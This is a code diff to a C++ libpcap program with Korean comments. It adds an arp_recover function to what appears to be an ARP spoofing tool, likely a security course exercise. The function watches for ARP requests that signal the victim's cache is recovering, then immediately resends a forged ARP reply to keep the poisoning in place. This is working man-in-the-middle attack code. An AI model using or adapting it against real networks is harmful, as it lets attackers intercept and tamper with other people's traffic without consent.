@@ -94,7 +94,7 @@ array<unsigned char, 4> get_ip_address(const string& iface) {
     return ip_address;
 }
 
-
+/* ARP 요청 */
 void send_arp_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
     EthArpPacket packet;
     
@@ -154,6 +154,31 @@ void send_arp_reply(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Ma
 
     if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
         throw runtime_error("ARP 응답 송신 실패: " + string(pcap_geterr(handle)));
+    }
+}
+
+void arp_recover(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip) {
+    cout << "waiting" << endl;
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* recv_packet;
+        int res = pcap_next_ex(handle, &header, &recv_packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            cerr << "캡쳐 실패: " << pcap_geterr(handle) << endl;
+            break;
+        }
+
+        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
+        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Request)) {
+            // ARP 요청 패킷이 감지되었을 때, 네트워크가 복구된 것으로 간주하고 다시 ARP 스푸핑 수행
+            //이때 reply를 안보내면 sender가 target에게 진짜 ip를 알려주기 때문에 재빠르게 reply를 보내준다.
+            if (recv_etharp->arp_.tip() == target_ip) {
+                cout << "detect recover and resend" << endl;
+                send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ip, target_ip);
+                break; // 다시 스푸핑 패킷을 보내고 종료
+            }
+        }
     }
 }
 
